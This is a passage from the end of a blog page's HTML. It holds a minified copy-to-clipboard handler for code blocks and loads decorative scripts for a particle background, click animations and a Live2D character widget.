t=$(this).parent().find(".code").find(".line").map(function(e,t){return $(t).text()}).toArray().join("\n"),n=document.createElement("textarea"),o=window.pageYOffset||document.documentElement.scrollTop;n.style.top=o+"px",n.style.position="absolute",n.style.opacity="0",n.readOnly=!0,n.value=t,document.body.appendChild(n),n.select(),n.setSelectionRange(0,t.length),n.readOnly=!1;document.execCommand("copy");n.blur(),$(this).blur()})).on("mouseleave",function(e){var t=$(this).find(".copy-btn");setTimeout(function(){t.text("复制")},300)}).append(t)})</script><script type="text/javascript" color="0,191,255" opacity="1" zindex="-2" count="60" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script><script type="text/javascript" src="/js/src/clicklove.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,debug:!1,model:{jsonPath:"/live2dw/assets/z16.model.json"},display:{position:"right",width:210,height:420},mobile:{show:!0},log:!1})</script></body></html>